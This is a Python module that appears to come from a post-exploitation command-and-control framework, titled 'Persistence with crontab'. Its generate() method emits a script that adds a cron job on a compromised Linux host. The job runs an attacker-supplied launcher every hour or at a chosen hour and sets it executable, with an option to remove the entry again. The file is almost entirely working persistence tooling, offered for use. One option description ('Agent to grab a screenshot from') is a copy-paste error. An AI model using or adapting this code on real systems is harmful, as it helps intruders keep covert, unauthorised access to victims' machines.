class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Persistence with crontab',

            # list of one or more authors for the module
            'Author': ['@424f424f'],

            # more verbose multi-line description of the module
            'Description': 'This module establishes persistence via crontab',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a screenshot from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove Persistence. True/False',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hourly' : {
                'Description'   :   'Hourly persistence.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hour' : {
                'Description'   :   'Hour to callback. 24hr format.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'FileName' : {
                'Description'   :   'File name for the launcher.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        Remove = self.options['Remove']['Value']
        Hourly = self.options['Hourly']['Value']
        Hour = self.options['Hour']['Value']
        FileName = self.options['FileName']['Value']

# updated Hour option to callback on the specified hr was previously set to every hour on specified minute
        script = """
import subprocess
import sys
Remove = "%s"
Hourly = "%s"
Hour = "%s"


if Remove == "True":
    cmd = 'crontab -l | grep -v "%s"  | crontab -'
    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
    print "Finished"

else:
    if Hourly == "True":
        cmd = 'crontab -l | { cat; echo "0 * * * * %s"; } | crontab -'
        print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
        print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
        print subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()
        print "Finished"

    elif Hour:
            cmd = 'crontab -l | { cat; echo "0 %s * * * %s"; } | crontab -'
            print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
            print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
            print subprocess.Popen('chmod +x %s', shell=True, stdout=subprocess.PIPE).stdout.read()
            print "Finished"

""" % (Remove, Hourly, Hour, FileName, FileName, FileName, Hour, FileName, FileName)
        return script
